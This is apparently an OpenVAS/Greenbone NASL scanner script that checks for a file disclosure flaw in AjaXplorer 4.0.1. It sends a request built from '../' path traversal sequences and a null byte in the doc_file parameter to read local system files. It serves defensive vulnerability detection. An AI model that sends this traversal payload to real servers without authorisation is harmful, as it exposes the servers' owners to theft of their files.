# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:ajaxplorer:ajaxplorer";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103422");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2012-02-15 12:40:42 +0100 (Wed, 15 Feb 2012)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:P/A:N");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("AjaXplorer <= 4.0.1 Information Disclosure Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_ajaxplorer_http_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("ajaxplorer/http/detected");

  script_tag(name:"summary", value:"AjaXplorer is prone to a local file disclosure vulnerability
  because it fails to adequately validate user-supplied input.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"Exploiting this vulnerability would allow an attacker to obtain
  potentially sensitive information from local text files on computers running the vulnerable
  application. This may aid in further attacks.");

  script_tag(name:"affected", value:"AjaXplorer version 4.0.1 and probably prior.");

  script_tag(name:"solution", value:"Update to version 4.0.2 or later.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51960");
  script_xref(name:"URL", value:"http://ajaxplorer.info/ajaxplorer-4-0-2/");

  exit(0);
}

include("host_details.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("os_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

files = traversal_files();

foreach file (keys(files)) {
  url = dir + "/index.php?get_action=display_doc&doc_file=" + crap(data: "../", length: 6 * 9) +
        files[file] + "%00";

  if (http_vuln_check(port: port, url: url, pattern: file)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
